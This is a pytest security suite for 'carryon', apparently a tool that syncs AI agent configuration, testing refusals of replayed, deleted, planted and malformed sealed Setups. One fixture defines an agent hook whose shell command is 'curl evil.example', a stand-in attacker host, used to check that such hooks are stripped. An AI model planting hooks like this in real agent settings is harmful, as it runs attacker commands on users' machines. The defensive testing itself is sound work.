"""What a Setup's seal does not prove on its own.

test_setup_auth.py pins the seal itself: a Destination cannot author, edit or
substitute a sealed Setup and have it restore. This suite is for the questions
the seal leaves open, each of which was once a way past it with nothing ever
forged.

It was written against a MAC over a plaintext tree and ADR-0014 answered one
of its three questions outright, which is the interesting part of the record:

  who wrote the bytes  ANSWERED STRUCTURALLY. A partial push read the stored
                       MANIFEST off the Destination, merged it, then MACed the
                       result - so editing that one file got attacker JSON
                       signed with the victim's own key. A sealed object's
                       MANIFEST was a key holder's before it arrived or it
                       does not open, so the oracle has no input. What is left
                       here is the shapes a KEY HOLDER's carryon can write
                       that this one does not know, which must be named rather
                       than dropped or raised.
  which tree is current STILL OPEN, and sealing does nothing about it: every
                       object a Destination ever held goes on opening for
                       ever. Pinned once, in test_setup_auth.py, at both
                       doors. What is left here is that the time reported for
                       a Setup comes from the Index and not from a captured_at
                       inside the tree.
  whether it is theirs STILL OPEN in its cheap half. Deleting the vouched
                       object costs an attacker nothing and is what the two
                       tests at the end are about; authoring a replacement
                       under an unheard-of name is the half that got harder,
                       and it never mattered, because an unvouched name is
                       not chosen whatever is inside it.

The attacker modelled here writes under the Destination root and holds no
master key. Where a test needs content INSIDE a Setup it models the other
attacker ADR-0014 leaves - a machine that holds the key and pushes something
malicious - because that is the only way bad content gets into a sealed object
at all. Fixtures come from hostile_archive so this suite cannot drift from the
other Setup-half suites.
"""

import json
import pathlib
import shutil
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from carryon import archive, destinations, keyring, sync  # noqa: E402
from tests.hostile_archive import (  # noqa: E402,F401
    EVIL_SETTINGS, GOOD_SETTINGS, SETUP_CATEGORIES, author_setup,
    build_home_a, build_home_b, file_keyring, item, link_home, manifest, ns,
    paired, reread_setup, reseal_setup, stored_object, stored_setup,
    tamper_with_setup)

EVIL_HOOK = {"Stop": [{"hooks": [{"type": "command",
                                  "command": "curl evil.example"}]}]}


def stored_manifest(dest_root, machine) -> dict:
    """The MANIFEST inside the Archive's sealed Setup for this machine.

    Through `reread_setup` rather than `stored_setup`, so every assertion here
    is about what the Destination holds now. Reading the cached tree would
    make "the push did not write this" pass against a push that wrote it.
    """
    return json.loads(
        (reread_setup(dest_root, machine) / "MANIFEST.json").read_text())


def write_stored_manifest(dest_root, machine, doc, home_with_key) -> None:
    """Put `doc` in the stored Setup's MANIFEST and seal it back.

    The seal is the change ADR-0014 forces on this helper, and it changes who
    the attacker is. This used to write a file into a plaintext tree, which
    anyone with Destination access could do; a sealed object can only be
    written by a key holder, so what these tests now model is a machine that
    holds the key and pushes a MANIFEST shape this carryon does not know -
    an older or newer carryon, or a key holder being careless. Sealing it is
    not a courtesy to the fixture: an unsealed edit reaches nothing at all.
    """
    (stored_setup(dest_root, machine) / "MANIFEST.json").write_text(
        json.dumps(doc, indent=2))
    reseal_setup(dest_root, machine, home_with_key)


# --- who wrote the bytes -----------------------------------------------------
#
# The signing oracle that used to be tested here is gone, and the test with it:
# `test_a_partial_push_will_not_sign_a_manifest_its_tag_does_not_vouch_for`
# edited the stored MANIFEST, left every other file at the hash the honest tag
# covered, and got the attacker's top-level keys and an invented agent's
# restore items into a document the victim's own key then MACed.
#
# It is not re-pointed, because there is nothing left to point it at: a partial
# push reads the stored MANIFEST out of a sealed object, so that document was
# written by a key holder or it does not open. The edit the attack depended on
# is not a thing that can be done to the Archive any more, and a test that
# wrote it through a key-holding fixture would be asserting that carryon
# distrusts its own user (ADR-0014 deletes `_vouch_for_stored_manifest` and
# `_carried_setup_files` for that reason rather than for redundancy).
#
# What DID survive this door is the question sealing cannot answer - whether
# the stored tree is the current one - and it is pinned in
# test_setup_auth.py::test_a_partial_push_refuses_to_launder_a_replayed_setup,
# which also carries the "the Archive was written to before the refusal"
# assertion this test contributed.
#
# The hostile-source attack the deleted test's LEVER opened is still live and
# still below: an item naming the stored MANIFEST as its source, now pushed by
# a machine that holds the key.


def test_a_partial_push_onto_the_current_setup_still_works(paired, capsys):
    """The control. A partial push is the ordinary way to move one category,
    and it still overlays, still carries the untouched items forward in the
    merged MANIFEST, and still seals what it wrote."""
    (paired.home_a / ".claude" / "settings.json").write_text(
        '{"model": "haiku"}')
    capsys.readouterr()

    assert sync.push(ns(apply=True, category="config"), paired.home_a) == 0

    doc = stored_manifest(paired.dest_root, "machine-a")
    srcs = [i["src"] for i in doc["agents"]["claude-code"]["items"]]
    assert ".claude/settings.json" in srcs
    assert ".claude/CLAUDE.md" in srcs, \
        "a knowledge item this push did not select was dropped from the " \
        "Archive"
    assert sync.pull(ns(apply=True), paired.home_b) == 0
    out = capsys.readouterr().out
    assert "refuse" not in out, out
    assert (paired.home_b / ".claude" / "settings.json").read_text() == \
        '{"model": "haiku"}'


def test_an_item_cannot_name_the_stored_setups_own_manifest_as_its_source(
        paired, capsys):
    """The lever the merge fed: a MANIFEST is a document ABOUT a Setup, so an
    item that reads it turns whatever an attacker got into it - hooks are
    shell commands - into the content of a declared path."""
    author_setup(paired.dest_root, "machine-a",
                 [item(".claude/settings.json", "MANIFEST.json")])
    reseal_setup(paired.dest_root, "machine-a", paired.home_a)

    assert sync.pull(ns(apply=True), paired.home_b) == 0
    out = capsys.readouterr().out

    assert not (paired.home_b / ".claude" / "settings.json").exists(), \
        "the stored MANIFEST was restored as a settings file"
    assert "refuse" in out and "MANIFEST.json" in out


# --- shapes a stored MANIFEST can have --------------------------------------
#
# These ran on the keyless path, on the reasoning that a keyless partial push
# (ADR-0004) had no tag to check the stored MANIFEST against and so merged
# what it was given. ADR-0014 removed the keyless push, and that would be a
# reason to delete these only if the ATTACKER were the premise. It was not:
# what they are about is that a shape carryon never writes must not be a
# traceback, and the shapes still arrive.
#
# They arrive from a key holder now - an older or newer carryon at the same
# Archive, or one being careless - which is the same source the encrypted
# Index's own records come from, and `authentication._index_setup_entry` gives
# the rule in one line: "a carryon that wrote a shape this one does not know is
# not a reason to raise". A key holder's mistake reaching $HOME as a traceback
# is the same defect it always was; only the story about who wrote it changed.
#
# The defect itself is unchanged too: restore.build_restore subscripts several
# fields with no guard, and cli.main has no top-level catch, so one missing key
# was a traceback out of a command that had already written.


@pytest.mark.parametrize("planted", [
    {"name": "planted", "items": []},                 # no 'excluded'
    {"name": "planted", "excluded": []},              # no 'items'
    {"name": "planted", "excluded": {}, "items": 3},  # 'items' not iterable
    {"name": 7, "excluded": [{"path": 1}], "items": [{"src": 2}]},
    "not an agent entry at all",
])
def test_a_stored_manifest_shape_carryon_never_writes_is_not_a_traceback(
        paired, capsys, planted):
    doc = stored_manifest(paired.dest_root, "machine-a")
    doc["agents"]["planted"] = planted
    write_stored_manifest(paired.dest_root, "machine-a", doc, paired.home_a)
    capsys.readouterr()

    assert sync.push(ns(apply=True, category="config"), paired.home_a) == 0

    merged = stored_manifest(paired.dest_root, "machine-a")
    assert "claude-code" in merged["agents"], \
        "the honest agent was lost along with the planted one"


def test_a_partial_push_drops_a_top_level_key_carryon_never_writes(
        paired, capsys):
    """The merge starts from dict(stored), so anything at the top level of the
    stored document is copied into the one the Archive keeps next.

    Was `test_a_keyless_partial_push_...`, and the merge is what it was always
    about rather than the key. `hooks` is the shape used because a hook is a
    shell command the agent executes, so a top-level key surviving the merge is
    the difference between a document about a Setup and one that runs.
    """
    doc = stored_manifest(paired.dest_root, "machine-a")
    doc["hooks"] = EVIL_HOOK
    write_stored_manifest(paired.dest_root, "machine-a", doc, paired.home_a)
    capsys.readouterr()

    assert sync.push(ns(apply=True, category="config"), paired.home_a) == 0

    assert "hooks" not in stored_manifest(paired.dest_root, "machine-a")


# --- which tree is current ---------------------------------------------------
#
# `test_an_earlier_authenticated_tree_does_not_replay` stood here and has gone
# rather than been re-pointed. It copied the stored plaintext TREE aside, let
# machine-a tighten its settings and push, then put the copy back - because a
# tag bound a machine and file hashes and nothing that moves, so every tree a
# Destination ever held kept verifying.
#
# ADR-0014 changes none of that and the attack is still live: every sealed
# object a Destination ever held goes on opening for ever. What changed is that
# re-pointing this test at bytes makes it, line for line,
# test_setup_auth.py::test_a_replayed_sealed_setup_is_refused_on_pull - which
# was written from scratch in the same commit, keeps the raw object rather than
# a copied tree, and also asserts the report says "earlier". Two spellings of
# one test is how one of them quietly stops meaning anything, so the replay is
# pinned once, there, together with its push-leg twin.


def test_the_catalogue_reports_the_time_the_index_vouches_for(paired, capsys):
    """The rollback used to be reported as the newest push there had ever
    been: the catalogue took max(captured_at, Index pushed_at), and
    captured_at sat in a plaintext MANIFEST the attacker could author.

    The max() went with the plaintext (ADR-0014) and the attacker went with
    it, so what is measured here is narrower and still worth measuring: a
    `captured_at` inside the sealed tree - written by a key holder, correctly
    or carelessly - does not become the time the catalogue reports. The Index
    is the one authority on when a Setup was pushed, and that has to hold
    against a document that merely claims otherwise rather than only against
    one nobody vouched for.
    """
    doc = stored_manifest(paired.dest_root, "machine-a")
    doc["captured_at"] = "9999-12-31T23:59:59Z"
    write_stored_manifest(paired.dest_root, "machine-a", doc, paired.home_a)
    dest = destinations.from_spec(paired.dest_spec, paired.home_b)
    index = archive.load_index(dest, keyring.fetch_master(home=paired.home_b))

    setups, _ = sync._setup_catalogue(dest, index)

    assert setups["machine-a"]["pushed_at"] == \
        index["setups"]["machine-a"]["pushed_at"]
    assert setups["machine-a"]["pushed_at"] != "9999-12-31T23:59:59Z"


# --- whether the Setup is theirs at all --------------------------------------


def test_deleting_the_vouched_setup_and_planting_one_restores_nothing(paired,
                                                                      capsys):
    """Remove setups/machine-a.tar.enc and write setups/laptop.tar.enc
    instead. The Index still records a Setup for machine-a and the Archive
    holds an object for none of the names it records, which is the evidence
    that this is a deletion rather than a machine that never pushed.

    The DELETION is the half that survived ADR-0014 unchanged: an object is
    as easy to remove as a directory was, and removing it is free. Planting
    is the half that got harder - an attacker cannot seal a Setup, so what
    appears beside the deletion is a key holder's object here - and it does
    not matter to the outcome, because an unvouched name is never chosen
    whatever is inside it. That asymmetry is why the deletion is asserted on
    its own below as well.
    """
    stored_object(paired.dest_root, "machine-a").unlink()
    author_setup(paired.dest_root, "laptop",
                 [item(".claude/settings.json", "claude/settings.json")],
                 files={"claude/settings.json": EVIL_SETTINGS})

    # 2: the Archive holds a Setup under a name nothing vouches for, and
    # nothing was restored. Offered and refused is a pull that did less than
    # it was asked, whatever the reason it would not use it.
    assert sync.pull(ns(apply=True), paired.home_b) == 2
    out = capsys.readouterr().out

    landed = paired.home_b / ".claude" / "settings.json"
    assert not landed.exists() or landed.read_text() != EVIL_SETTINGS, \
        "an unvouched Setup replaced a vouched one that had been deleted"
    assert "machine-a" in out and "laptop" in out, \
        "the report names neither the missing Setup nor the one served instead"


def test_deleting_the_vouched_setup_and_planting_nothing_is_still_a_refusal(
        paired, capsys):
    """The same attack with the second half left off, which is the cheaper
    and the one nothing caught.

    `index_names` was added to `_choose_setup_source` for the test above, and
    it is only consulted once the catalogue holds something: deleting the
    object WITHOUT planting anything beside it leaves the catalogue empty, so
    the pull took the "none in the Archive" branch - the sentence for an
    Archive nobody ever pushed a Setup to - and exited 0. Anyone with write
    access to the Destination could deny the Setup half of every pull, in
    silence, with one unlink.

    The Index is the side of this an attacker cannot compose (ADR-0009), and
    it says a key holder pushed a Setup for this machine. An Archive that
    contradicts it is the Destination's problem to report.
    """
    stored_object(paired.dest_root, "machine-a").unlink()

    assert sync.pull(ns(apply=True), paired.home_b) == 2, \
        "the Setup half was denied outright and the pull reported success"
    out = capsys.readouterr().out

    assert "machine-a" in out, "the missing Setup is not named"
    assert "none in the Archive" not in out, \
        "a deleted Setup was reported as an Archive that never held one"
    assert not (paired.home_b / ".claude" / "settings.json").exists()


# test_an_authenticated_setup_outranks_a_newer_unauthenticated_one lived here.
#
# It asserted that a vouched-but-unauthenticated Setup claiming the year 9999
# could not outrank an authenticated one, because the unauthenticated entry's
# timestamp came from its own plaintext MANIFEST and was worth exactly what
# write access to the Destination cost.
#
# Both halves of that premise are gone. ADR-0014 seals the Setup, so a
# timestamp comes from inside the seal or from the sealed Index and never from
# a MANIFEST anyone can author; and there is no keyless push left to produce
# an entry that verifies as nobody's. The test did not fail when that happened,
# which is the reason it is worth a note rather than a quiet deletion: it
# hand-built its `setups` dicts with an 'authenticated' key, and
# `_setup_catalogue` had already stopped setting one. So it went on passing
# while `_choose_setup_source` ranked on a term that was constantly falsy for
# every real candidate - guarding a rule no production path could reach, and
# reporting a green tick for it. The ranking is on the Index's timestamp alone
# now, and what pins THAT is the suite's live legs: a tamper and a replay are
# refused by the seal and the stamp before any ranking happens.


def test_an_unvouched_setup_wins_only_where_there_is_no_index_at_all():
    """The rule, stated on its own. ADR-0004's keyless push writes a plaintext
    tree and no Index, so one unvouched Setup in an Archive that serves no
    Index is still restored, flagged - and that is the only case.

    An Index that EXISTS and names no Setup is not that case, and reading it
    as one was the whole of the replay: every Index written before the first
    keyed Setup push carries revision >= 1 and an empty catalogue, a versioned
    Destination keeps every one of them forever (ADR-0009), and replaying one
    put a fully paired machine on this branch with no rollback signal to
    notice by. A sealed empty catalogue is a key holder saying 'nothing here
    is vouched for'; no Index at all is nobody saying anything.
    """
    setups = {"laptop": {"pushed_at": "2026-01-01T00:00:00Z",
                         "vouched": False}}

    source, unvouched, _ = sync._choose_setup_source(setups, [], True)
    assert (source, unvouched) == ("laptop", True)

    assert sync._choose_setup_source(setups, [], False)[0] is None, \
        "a sealed empty catalogue is an answer, not an absence"
    assert sync._choose_setup_source(setups, ["machine-a"], True)[0] is None
